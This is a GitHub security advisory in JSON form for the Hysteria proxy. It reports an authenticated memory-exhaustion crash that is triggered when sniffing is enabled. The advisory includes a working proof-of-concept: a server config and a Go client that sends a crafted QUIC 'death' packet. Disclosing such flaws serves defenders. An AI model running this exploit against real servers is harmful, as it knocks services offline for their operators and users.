{"credits": [{"type": "reporter", "user": {"avatar_url": "https://avatars.githubusercontent.com/u/37233261?v=4", "events_url": "https://api.github.com/users/Cherrling/events{/privacy}", "followers_url": "https://api.github.com/users/Cherrling/followers", "following_url": "https://api.github.com/users/Cherrling/following{/other_user}", "gists_url": "https://api.github.com/users/Cherrling/gists{/gist_id}", "gravatar_id": "", "html_url": "https://github.com/Cherrling", "id": 37233261, "login": "Cherrling", "node_id": "MDQ6VXNlcjM3MjMzMjYx", "organizations_url": "https://api.github.com/users/Cherrling/orgs", "received_events_url": "https://api.github.com/users/Cherrling/received_events", "repos_url": "https://api.github.com/users/Cherrling/repos", "site_admin": false, "starred_url": "https://api.github.com/users/Cherrling/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/Cherrling/subscriptions", "type": "User", "url": "https://api.github.com/users/Cherrling", "user_view_type": "public"}}], "cve_id": null, "cvss": {"score": 8.8, "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}, "cvss_severities": {"cvss_v3": {"score": 8.8, "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}, "cvss_v4": {"score": 0.0, "vector_string": null}}, "cwes": [{"cwe_id": "CWE-770", "name": "Allocation of Resources Without Limits or Throttling"}], "description": "### Summary

A specially constructed quic package can crash the server OOM when the sniff is enabled.

### Details

When the server has sniff enabled, a valid connection can request the server to forward UDP traffic and construct a huge crypto length. The server will allocate memory according to this length, causing an OOM.


### PoC
```
openssl req -x509 -newkey rsa:2048 -nodes -keyout localhost.key -out localhost.crt -days 365 -subj "/CN=localhost" 2>/dev/null
```

server.yaml
```
listen: :8443
tls:
  cert: localhost.crt
  key: localhost.key
auth:
  type: password
  password: mypassword
sniff:
  enable: true
outbounds:
  - name: my_direct
    type: direct
    default: true
```

poc.go

```
package main

import (
	"flag"
	"fmt"
	"log"
	"net"
	"time"

	"github.com/apernet/hysteria/core/v2/client"
)

func main() {
	serverAddrStr := flag.String("server", "127.0.0.1:8443", "Hysteria server address")
	password := flag.String("password", "mypassword", "Hysteria server password")
	flag.Parse()

	serverAddr, _ := net.ResolveUDPAddr("udp", *serverAddrStr)
	c, _, err := client.NewClient(&client.Config{
		ServerAddr: serverAddr, Auth: *password, TLSConfig: client.TLSConfig{InsecureSkipVerify: true},
	})
	if err != nil {
		log.Fatalf("Failed to connect: %v", err)
	}
	defer c.Close()
                                                                                                                
	var maliciousQUICPacket = []byte{                                                                                                                                                                         
		0xcb, 0x0, 0x0, 0x0, 0x1, 0x8, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x0, 0x0,                                                                                                              
		0x32, 0x1d, 0xa8, 0xd6, 0x3c, 0x51, 0x24, 0xb7, 0xbe, 0xf2, 0x91, 0x77, 0x1c, 0x9d, 0x66,                                                                                                             
		0xfc, 0xab, 0x91, 0x1e, 0xaf, 0xf9, 0x14, 0xd5, 0xec, 0xb0, 0x74, 0x46, 0x4f, 0x4, 0x70,                                                                                                              
		0x18, 0x35, 0x31, 0xc5, 0xea, 0x36, 0x40, 0x36, 0x65, 0xdf, 0xa4, 0xcc, 0xf9, 0xff, 0x65,                                                                                                             
		0xe5, 0x1d, 0xb7, 0xc5, 0xc2, 0xc2,                                                                                                                                                                   
	} 

	udpConn, err := c.UDP()
	if err != nil {
		fmt.Printf("[-] UDP error: %v\n", err)
	}
	targetAddr := fmt.Sprintf("8.8.8.8:443")
	fmt.Printf("[*] Sending 'death' packet to %s...\n", targetAddr)
	_ = udpConn.Send(maliciousQUICPacket, targetAddr)

	// Wait longer to ensure packet delivery
	time.Sleep(3 * time.Second)
	fmt.Printf("[+] Done.\n")
}
```


### Impact
When sniffing is enabled on the server, a user with a valid password can launch an attack that could cause the server to run out of memory (OOM).", "ghsa_id": "GHSA-9fw6-xgg2-mq9q", "github_reviewed_at": "2026-05-05T21:14:22Z", "html_url": "https://github.com/advisories/GHSA-9fw6-xgg2-mq9q", "identifiers": [{"type": "GHSA", "value": "GHSA-9fw6-xgg2-mq9q"}], "nvd_published_at": null, "published_at": "2026-05-05T21:14:22Z", "references": ["https://github.com/apernet/hysteria/security/advisories/GHSA-9fw6-xgg2-mq9q", "https://github.com/advisories/GHSA-9fw6-xgg2-mq9q"], "repository_advisory_url": "https://api.github.com/repos/apernet/hysteria/security-advisories/GHSA-9fw6-xgg2-mq9q", "severity": "high", "source_code_location": "https://github.com/apernet/hysteria", "summary": "Hysteria: A specially constructed quic package can crash the server OOM when the sniff is enabled", "type": "reviewed", "updated_at": "2026-05-05T21:14:22Z", "url": "https://api.github.com/advisories/GHSA-9fw6-xgg2-mq9q", "vulnerabilities": [{"first_patched_version": null, "package": {"ecosystem": "go", "name": "github.com/apernet/hysteria/core/v2"}, "vulnerable_functions": [], "vulnerable_version_range": "<= 2.8.1"}], "withdrawn_at": null}

title: Hysteria: A specially constructed quic package can crash the server OOM when the sniff is enabled
